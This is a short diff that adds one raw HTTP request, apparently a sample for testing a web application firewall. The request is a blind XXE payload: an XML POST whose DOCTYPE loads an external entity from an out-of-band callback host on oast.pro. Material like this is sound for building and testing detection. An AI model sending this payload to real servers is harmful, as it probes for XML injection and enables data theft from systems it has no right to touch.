@@ -1,0 +1,12 @@
+POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
+Host: www.swaf.com
+Content-Length: 151
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+Accept-Encoding: gzip
+Content-Type: application/xml
+X-Forwarded-For: 223.104.38.56
+W-Forwarded-Protocol: https
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE syscode SYSTEM "http://d927akbelkhiln7uo4t0nukuzfkiwoeqr.oast.pro">
+<M><syscode>&send;</syscode></M>
